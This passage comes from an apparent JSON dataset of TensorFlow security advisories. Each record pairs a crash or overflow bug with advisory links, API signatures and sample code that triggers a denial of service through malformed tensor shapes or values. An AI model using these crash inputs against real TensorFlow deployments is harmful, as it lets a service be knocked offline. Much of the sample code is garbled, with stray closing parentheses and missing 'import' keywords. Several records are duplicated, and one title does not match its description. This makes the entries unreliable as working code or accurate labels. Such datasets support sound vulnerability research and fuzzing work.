    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-689c-r7h2-fv9v",
    "API Signature": "tf.raw_ops.QuantizedMatMul(\n    a,\n    b,\n    min_a,\n    max_a,\n    min_b,\n    max_b,\n    Toutput=tf.dtypes.qint32,\n    transpose_a=False,\n    transpose_b=False,\n    Tactivation=tf.dtypes.quint8,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `FakeQuantWithMinMaxVarsPerChannel`\n      ",
    "Bug description": "If  FakeQuantWithMinMaxVarsPerChannel  is given  min  or  max  tensors of a rank other than one, it results in a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "num_bits = 8\nnarrow_range = False\ninputs = tf.constant(0, shape=[4], dtype=tf.float32)\nmin = tf.constant([], shape=[4,0,0], dtype=tf.float32)\nmax = tf.constant(0, shape=[4], dtype=tf.float32)\n)\ntf.raw_ops.FakeQuantWithMinMaxVarsPerChannel(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9j4v-pp28-mxv7",
    "API Signature": "tf.raw_ops.FakeQuantWithMinMaxVarsPerChannel(\n    inputs, min, max, num_bits=8, narrow_range=False, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizedBiasAdd`\n      ",
    "Bug description": "If  QuantizedBiasAdd  is given  min_input ,  max_input ,  min_bias ,  max_bias  tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "out_type = tf.qint32\ninput = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)\nbias = tf.constant(43, shape=[2,3], dtype=tf.quint8)\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_bias = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_bias = tf.constant(0, shape=[1], dtype=tf.float32)\n)\ntf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4pc4-m9mj-v2r9",
    "API Signature": "tf.raw_ops.QuantizedBiasAdd(\n    input, bias, min_input, max_input, min_bias, max_bias, out_type, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `Requantize`\n      ",
    "Bug description": "If  Requantize  is given  input_min ,  input_max ,  requested_output_min ,  requested_output_max  tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "out_type = tf.quint8\ninput = tf.constant([1], shape=[3], dtype=tf.qint32)\ninput_min = tf.constant([], shape=[0], dtype=tf.float32)\ninput_max = tf.constant(-256, shape=[1], dtype=tf.float32)\nrequested_output_min = tf.constant(-256, shape=[1], dtype=tf.float32)\nrequested_output_max = tf.constant(-256, shape=[1], dtype=tf.float32)\n)\ntf.raw_ops.Requantize(input=input, input_min=input_min, input_max=input_max, requested_output_min=requested_output_min, requested_output_max=requested_output_max, out_type=out_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wqmc-pm8c-2jhc",
    "API Signature": "tf.raw_ops.Requantize(\n    input,\n    input_min,\n    input_max,\n    requested_output_min,\n    requested_output_max,\n    out_type,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `FakeQuantWithMinMaxVars`\n      ",
    "Bug description": "If  FakeQuantWithMinMaxVars  is given  min  or  max  tensors of a nonzero rank, it results in a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "num_bits = 8\nnarrow_range = False\ninputs = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmin = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmax = tf.constant(0, shape=[2,3], dtype=tf.float32)\n)\ntf.raw_ops.FakeQuantWithMinMaxVars(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9fpg-838v-wpv7",
    "API Signature": "tf.raw_ops.FakeQuantWithMinMaxVars(\n    inputs, min, max, num_bits=8, narrow_range=False, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizedInstanceNorm`\n      ",
    "Bug description": "If  QuantizedInstanceNorm  is given  x_min  or  x_max  tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "output_range_given = False\ngiven_y_min = 0\ngiven_y_max = 0\nvariance_epsilon = 1e-05\nmin_separation = 0.001\nx = tf.constant(88, shape=[1,4,4,32], dtype=tf.quint8)\nx_min = tf.constant([], shape=[0], dtype=tf.float32)\nx_max = tf.constant(0, shape=[], dtype=tf.float32)\n)\ntf.raw_ops.QuantizedInstanceNorm(x=x, x_min=x_min, x_max=x_max, output_range_given=output_range_given, given_y_min=given_y_min, given_y_max=given_y_max, variance_epsilon=variance_epsilon, min_separation=min_separation)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g35r-369w-3fqp",
    "API Signature": "tf.raw_ops.QuantizedInstanceNorm(\n    x,\n    x_min,\n    x_max,\n    output_range_given=False,\n    given_y_min=0,\n    given_y_max=0,\n    variance_epsilon=1e-05,\n    min_separation=0.001,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `Conv2DBackpropInput`\n      ",
    "Bug description": "The implementation of  Conv2DBackpropInput  requires  input_sizes  to be 4-dimensional. Otherwise, it gives a  CHECK  failure which can be used to trigger a denial of service attack:",
    "Sample Code": "strides = [1, 1, 1, 1]\npadding = \"SAME\"\nuse_cudnn_on_gpu = True\nexplicit_paddings = []\ndata_format = \"NHWC\"\ndilations = [1, 1, 1, 1]\ninput_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)\nfilter = tf.constant(0.159749106, shape=[3,3,2,2], dtype=tf.float32)\nout_backprop = tf.constant(0, shape=[], dtype=tf.float32)\n)\ntf.raw_ops.Conv2DBackpropInput(input_sizes=input_sizes, filter=filter, out_backprop=out_backprop, strides=strides, padding=padding, use_cudnn_on_gpu=use_cudnn_on_gpu, explicit_paddings=explicit_paddings, data_format=data_format, dilations=dilations)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q2c3-jpmc-gfjx",
    "API Signature": "tf.raw_ops.Conv2DBackpropInput(\n    input_sizes,\n    filter,\n    out_backprop,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `AvgPoolGrad`\n      ",
    "Bug description": "The implementation of  AvgPoolGrad  does not fully validate the input  orig_input_shape . This results in a  CHECK  failure which can be used to trigger a denial of service attack:",
    "Sample Code": "ksize = [1, 2, 2, 1]\nstrides = [1, 2, 2, 1]\npadding = \"VALID\"\ndata_format = \"NHWC\"\norig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)\ngrad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)\n)\ntf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2475-53vw-vp25",
    "API Signature": "tf.raw_ops.AvgPoolGrad(\n    orig_input_shape,\n    grad,\n    ksize,\n    strides,\n    padding,\n    data_format='NHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizedAdd`\n      ",
    "Bug description": "If  QuantizedAdd  is given  min_input  or  max_input  tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "Toutput = tf.qint32\nx = tf.constant(140, shape=[1], dtype=tf.quint8)\ny = tf.constant(26, shape=[10], dtype=tf.quint8)\nmin_x = tf.constant([], shape=[0], dtype=tf.float32)\nmax_x = tf.constant(0, shape=[], dtype=tf.float32)\nmin_y = tf.constant(0, shape=[], dtype=tf.float32)\nmax_y = tf.constant(0, shape=[], dtype=tf.float32)\n)\ntf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y, Toutput=Toutput)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v6h3-348g-6h5x",
    "API Signature": "tf.raw_ops.QuantizedAdd(\n    x,\n    y,\n    min_x,\n    max_x,\n    min_y,\n    max_y,\n    Toutput=tf.dtypes.qint32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizedAvgPool`\n      ",
    "Bug description": "If  QuantizedAvgPool  is given  min_input  or  max_input  tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "ksize = [1, 2, 2, 1]\nstrides = [1, 2, 2, 1]\npadding = \"SAME\"\ninput = tf.constant(1, shape=[1,4,4,2], dtype=tf.quint8)\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[1], dtype=tf.float32)\n)\ntf.raw_ops.QuantizedAvgPool(input=input, min_input=min_input, max_input=max_input, ksize=ksize, strides=strides, padding=padding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4w68-4x85-mjj9",
    "API Signature": "tf.raw_ops.QuantizedAvgPool(\n    input, min_input, max_input, ksize, strides, padding, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `LowerBound` and `UpperBound`\n      ",
    "Bug description": "If  LowerBound  or  UpperBound  is given an empty sorted_inputs  input, it results in a  nullptr  dereference, leading to a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "out_type = tf.int64\nsorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)\nvalues = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)\n)\ntf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qxpx-j395-pw36",
    "API Signature": "tf.raw_ops.LowerBound(\n    sorted_inputs,\n    values,\n    out_type=tf.dtypes.int32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `LowerBound` and `UpperBound`\n      ",
    "Bug description": "If  LowerBound  or  UpperBound  is given an empty sorted_inputs  input, it results in a  nullptr  dereference, leading to a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "out_type = tf.int64\nsorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)\nvalues = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)\n)\ntf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qxpx-j395-pw36",
    "API Signature": "tf.raw_ops.UpperBound(\n    sorted_inputs,\n    values,\n    out_type=tf.dtypes.int32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `BlockLSTMGradV2`\n      ",
    "Bug description": "The implementation of  BlockLSTMGradV2  does not fully validate its inputs.",
    "Sample Code": "use_peephole = False\nseq_len_max = tf.constant(1, shape=[], dtype=tf.int64)\nx = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nw = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nb = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ni = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\no = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\n)\ntf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668",
    "API Signature": "tf.raw_ops.BlockLSTMGradV2(\n    seq_len_max,\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    i,\n    cs,\n    f,\n    o,\n    ci,\n    co,\n    h,\n    cs_grad,\n    h_grad,\n    use_peephole,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `BlockLSTMGradV2`\n      ",
    "Bug description": "The implementation of  BlockLSTMGradV2  does not fully validate its inputs.",
    "Sample Code": "use_peephole = False\nseq_len_max = tf.constant(1, shape=[], dtype=tf.int64)\nx = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nw = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nb = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ni = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\no = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\n)\ntf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668",
    "API Signature": "tf.raw_ops.BlockLSTMGradV2(\n    seq_len_max,\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    i,\n    cs,\n    f,\n    o,\n    ci,\n    co,\n    h,\n    cs_grad,\n    h_grad,\n    use_peephole,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `BlockLSTMGradV2`\n      ",
    "Bug description": "The implementation of  BlockLSTMGradV2  does not fully validate its inputs.",
    "Sample Code": "use_peephole = False\nseq_len_max = tf.constant(1, shape=[], dtype=tf.int64)\nx = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nw = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nb = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ni = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\no = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\n)\ntf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668",
    "API Signature": "tf.raw_ops.BlockLSTMGradV2(\n    seq_len_max,\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    i,\n    cs,\n    f,\n    o,\n    ci,\n    co,\n    h,\n    cs_grad,\n    h_grad,\n    use_peephole,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failures in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The implementation of  FractionalAvgPoolGrad  does not fully validate the input  orig_input_tensor_shape . This results in an overflow that results in a   CHECK  failure which can be used to trigger a denial of service attack.",
    "Sample Code": "overlapping = True\norig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)\nrow_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\n)\ntf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failures in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The implementation of  FractionalAvgPoolGrad  does not fully validate the input  orig_input_tensor_shape . This results in an overflow that results in a   CHECK  failure which can be used to trigger a denial of service attack.",
    "Sample Code": "overlapping = True\norig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)\nrow_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\n)\ntf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failures in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The implementation of  FractionalAvgPoolGrad  does not fully validate the input  orig_input_tensor_shape . This results in an overflow that results in a   CHECK  failure which can be used to trigger a denial of service attack.",
    "Sample Code": "overlapping = True\norig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)\nrow_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\n)\ntf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failures in `AvgPool3DGrad`\n      ",
    "Bug description": "The implementation of  AvgPool3DGradOp  does not fully validate the input  orig_input_shape . This results in an overflow that results in a   CHECK  failure which can be used to trigger a denial of service attack:",
    "Sample Code": "ksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\ndata_format = \"NDHWC\"\norig_input_shape = tf.constant(1879048192, shape=[5], dtype=tf.int32)\ngrad = tf.constant(1, shape=[1,3,2,4,2], dtype=tf.float32)\n)\ntf.raw_ops.AvgPool3DGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wxjj-cgcx-r3vq",
    "API Signature": "tf.raw_ops.AvgPool3DGrad(\n    orig_input_shape,\n    grad,\n    ksize,\n    strides,\n    padding,\n    data_format='NDHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failures in `UnbatchGradOp`\n      ",
    "Bug description": "The  UnbatchGradOp  function takes an argument  id  that is assumed to be a scalar. A nonscalar  id  can trigger a  CHECK  failure and crash the program.",
    "Sample Code": "import tensorflow as tf\n\n# batch_index's size is not 3\n\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,], dtype=tf.int64))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5vq-gw2c-pq47",
    "API Signature": "tf.raw_ops.UnbatchGrad(\n    original_input,\n    batch_index,\n    grad,\n    id,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failures in `UnbatchGradOp`\n      ",
    "Bug description": "The  UnbatchGradOp  function takes an argument  id  that is assumed to be a scalar. A nonscalar  id  can trigger a  CHECK  failure and crash the program.",
    "Sample Code": "import tensorflow as tf\n\n# batch_index's size is not 3\n\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,], dtype=tf.int64))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5vq-gw2c-pq47",
    "API Signature": "tf.raw_ops.UnbatchGrad(\n    original_input,\n    batch_index,\n    grad,\n    id,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failure in `AvgPoolOp`\n      ",
    "Bug description": "The  AvgPoolOp  function takes an argument  ksize  that must be positive but is not checked. A negative  ksize  can trigger a  CHECK  failure and crash the program.",
    "Sample Code": "import numpy as np\n\nvalue = np.ones([1, 1, 1, 1])\nksize = [1, 1e20, 1, 1]\nstrides = [1, 1, 1, 1]\npadding = 'SAME'\ndata_format = 'NHWC'\n\n\n\ntf.raw_ops.AvgPool(value=value, ksize=ksize, strides=strides, padding=padding, data_format=data_format)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mgmh-g2v6-mqw5",
    "API Signature": "tf.raw_ops.AvgPool(\n    value, ksize, strides, padding, data_format='NHWC', name=None\n)\n"
  },
  {
    "Title": "\n        Int overflow in `RaggedRangeOp`\n      ",
    "Bug description": "The  RaggedRangOp  function takes an argument  limits  that is eventually used to construct a  TensorShape  as an  int64 . If  limits  is a very large float, it can overflow when converted to an  int64 . This triggers an  InvalidArgument  but also throws an abort signal that crashes the program.",
    "Sample Code": " tensorflow as tf\ntf.raw_ops.RaggedRange(starts=[1.1,0.1],limits=[10.0,1e20],deltas=[1,1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x989-q2pq-4q5x",
    "API Signature": "tf.raw_ops.RaggedRange(\n    starts,\n    limits,\n    deltas,\n    Tsplits=tf.dtypes.int64,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failure in `TensorListReserve` via missing validation\n      ",
    "Bug description": "In  core/kernels/list_kernels.cc's TensorListReserve ,  num_elements  is assumed to be a tensor of size 1. When a  num_elements  of more than 1 element is provided, then  tf.raw_ops.TensorListReserve  fails the  CHECK_EQ  in  CheckIsAlignedAndSingleElement .",
    "Sample Code": " tensorflow as tf\n\ntf.raw_ops.TensorListReserve(element_shape=(1,1), num_elements=tf.constant([1,1], dtype=tf.int32), element_dtype=tf.int8)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v5xg-3q2c-c2r4",
    "API Signature": "tf.raw_ops.TensorListReserve(\n    element_shape, num_elements, element_dtype, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failure in `SobolSample` via missing validation\n      ",
    "Bug description": "The implementation of SobolSampleOp is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by assuming  input(0) ,  input(1) , and  input(2)  to be scalar.",
    "Sample Code": " tensorflow as tf\ntf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-97p7-w86h-vcf9",
    "API Signature": "tf.raw_ops.SobolSample(\n    dim,\n    num_results,\n    skip,\n    dtype=tf.dtypes.float32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` failure in tf.reshape via overflows\n      ",
    "Bug description": "The implementation of tf.reshape op in TensorFlow is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by overflowing the number of elements in a tensor:",
    "Sample Code": " tensorflow as tf\n\ntf.reshape(tensor=[[1]],shape=tf.constant([0 for i in range(255)], dtype=tf.int64))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f4w6-h4f5-wx45",
    "API Signature": "tf.reshape(\n    tensor, shape, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault if `tf.histogram_fixed_width` is called with NaN values\n      ",
    "Bug description": "The implementation of  tf.histogram_fixed_width  is vulnerable to a crash when the values array contain  NaN  elements:",
    "Sample Code": "import numpy as np\n\n\n\ntf.histogram_fixed_width(values=np.nan, value_range=[1,2])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xrp2-fhq4-4q3w",
    "API Signature": "tf.histogram_fixed_width(\n    values,\n    value_range,\n    nbins=100,\n    dtype=tf.dtypes.int32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Denial of service in `tf.ragged.constant` due to lack of validation\n      ",
    "Bug description": "The implementation of  tf.ragged.constant  does not fully validate the input arguments. This results in a denial of service by consuming all available memory:",
    "Sample Code": " tensorflow as tf\ntf.ragged.constant(pylist=[],ragged_rank=8968073515812833920)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cwpm-f78v-7m5c",
    "API Signature": "tf.ragged.constant([[0], [1, 2]]).shape"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `Conv3DBackpropFilterV2`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.UnsortedSegmentJoin  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.strings.unsorted_segment_join(\n  inputs=['123'],\n  segment_ids=[0],\n  ],\n  num_segments=-1)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hx9q-2mx4-m4pg",
    "API Signature": "tf.strings.unsorted_segment_join(\n    inputs, segment_ids, num_segments, separator='', name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `Conv3DBackpropFilterV2`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.UnsortedSegmentJoin  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.strings.unsorted_segment_join(\n  inputs=['123'],\n  segment_ids=[0],\n  ],\n  num_segments=-1)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hx9q-2mx4-m4pg",
    "API Signature": "tf.strings.unsorted_segment_join(\n    inputs, segment_ids, num_segments, separator='', name=None\n)\n"
  },
  {
    "Title": "\n        Segfault and OOB write due to incomplete validation in `EditDistance`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.EditDistance  has incomplete validation. Users can pass negative values to cause a segmentation fault based denial of service:",
